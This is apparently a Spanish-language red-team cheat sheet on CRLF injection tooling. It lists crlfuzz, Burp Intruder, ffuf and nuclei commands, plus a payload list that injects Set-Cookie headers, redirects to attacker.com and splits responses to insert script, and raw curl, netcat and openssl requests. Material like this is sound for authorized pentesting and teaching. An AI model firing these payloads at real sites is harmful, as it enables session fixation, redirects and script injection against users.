---
aliases:
  - crlfuzz
  - CRLF Wordlists
  - Burp CRLF Injection
tags:
  - vuln/crlf-injection
  - technique/discovery
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación|Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[CRLF Injection]]"
  - "[[Burp Suite]]"
---
# CRLF Injection - Tooling

---

## crlfuzz (Go)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `go install github.com/dwisiswant0/crlfuzz/cmd/crlfuzz@latest` | Instala la herramienta | Setup inicial. |
| `crlfuzz -u "https://target.com/redirect?url=test"` | Fuzz single URL con payloads built-in | Probe rápido. |
| `crlfuzz -l urls.txt -c 50 -o results.txt` | Bulk scan paralelo, salida a archivo | Recon masivo. |
| `cat urls.txt \| crlfuzz` | Pipeline-friendly desde stdin | Combo con `gau`/`waybackurls`. |
| `gau target.com \| httpx -silent \| crlfuzz` | Pipeline completa: discovery → alive → fuzz | Bug bounty standard. |
| `crlfuzz -u "https://target/api" -X POST -H "Cookie: session=..."` | POST + autenticado | Endpoints post-login. |
| `crlfuzz -u "..." -p custom_payloads.txt` | Payloads custom para targets exóticos | Server-specific bypass. |
^crlfi-tool-crlfuzz

---

## Burp Intruder + Payloads

| **Comando / acción** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Repeater → click derecho → "Send to Intruder" | Payload position seleccionada | Setup standard. |
| Intruder → Positions → `Sniper` + `§param§` en value | Marca el param vulnerable | Single-param fuzz. |
| Payloads → Type `Simple list` → paste payloads | Lista custom de CRLF variants | Carga payloads. |
| Settings → Grep Match → `X-CRLF-Probe: FOUND` | Filtra responses con header inyectado | Auto-detect bypass exitoso. |
| Settings → Grep Extract → `Set-Cookie: ([^\r\n]+)` | Extrae cookies inyectadas | Validation. |
| Active Scan en URL (Burp Pro) | Detección automática de CRLF | Pasive scan baseline. |
| BApp Store → instalar `Param Miner` | Descubre headers/params ocultos cacheables | Combo cache poisoning. |
^crlfi-tool-burp

### Burp Intruder payload set

```
%0d%0aSet-Cookie:%20pwn=1
%0d%0aLocation:%20https://attacker.com
%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
%0a%0aHeader:%20test
%0d%0aX-CRLFi:%201
%250d%250aSet-Cookie:%20pwn=1
%E5%98%8A%E5%98%8DSet-Cookie:%20pwn=1
%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>SPLIT</html>
```

---

## Wordlists

| **Wordlist** | **Path / Repo** | **Cuándo** |
|:---:|:---:|:---:|
| `seclists/Fuzzing/CRLF-payloads/` | `/usr/share/seclists` (Kali) | Standard offline. |
| `PayloadsAllTheThings/CRLF Injection/` | github.com/swisskyrepo/PayloadsAllTheThings | Standard online. |
| `https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a` | HackTricks referencia | Documentación viva. |
| `crlfuzz` built-in payloads | Embedded en binario Go | Default sin descargar nada. |
| `nuclei-templates/http/vulnerabilities/generic/crlf-injection.yaml` | ~/.local/nuclei-templates | Nuclei scanner. |
^crlfi-tool-wordlists

---

## Manual curl + netcat

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI "https://target/r?url=test%0d%0aX-P:%20F"` | Test rápido con headers inyectados | Probe one-shot. |
| `curl -sI -D - "https://target/r?url=PAYLOAD"` | Dump headers completos a stdout | Inspección manual. |
| `curl -v "https://target/r?url=PAYLOAD" 2>&1 \| grep -E '^< '` | Solo response headers (verbose mode) | Debug. |
| `printf 'GET /r?url=test\r\nInjected: x HTTP/1.1\r\nHost: target.com\r\n\r\n' \| openssl s_client -quiet -connect target.com:443` | Raw HTTPS request via openssl | Low-level, evita normalización curl. |
| `printf 'GET /r?url=test\r\nInjected: x HTTP/1.1\r\nHost: target.com\r\n\r\n' \| nc -nv target.com 80` | Raw HTTP via netcat | HTTP-only targets. |
^crlfi-tool-curl

### Manual one-liner

```bash
TARGET="https://target.com/redirect"
PARAM="url"

PAYLOAD=$(printf 'test%%0d%%0aSet-Cookie:%%20pwn=1')

curl -sI "${TARGET}?${PARAM}=${PAYLOAD}"

# Send raw via netcat (HTTP only)
echo -e "GET /redirect?url=test\r\nSet-Cookie: pwn=1 HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80
```

---

## Otros tools

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `nuclei -t http/vulnerabilities/generic/crlf-injection.yaml -u https://target` | Scan basado en template | Bulk. |
| `ffuf -u "https://target/r?p=FUZZ" -w crlf-payloads.txt -mr 'X-Probe'` | Fuzzer con match regex | Standard fuzz. |
| `dalfox url "https://target/r?url=test" --mining-dom --custom-payload crlf.txt` | XSS + CRLF combo scanner | Multi-vector. |
| `cat urls.txt \| xargs -I {} curl -sI '{}?p=test%0d%0aFoo:bar' \| grep Foo` | Quick mass-test via xargs | Recon casero. |
| `mitmproxy -s crlf-detect.py` | Proxy con script de detección | In-band testing. |
^crlfi-tool-others

---
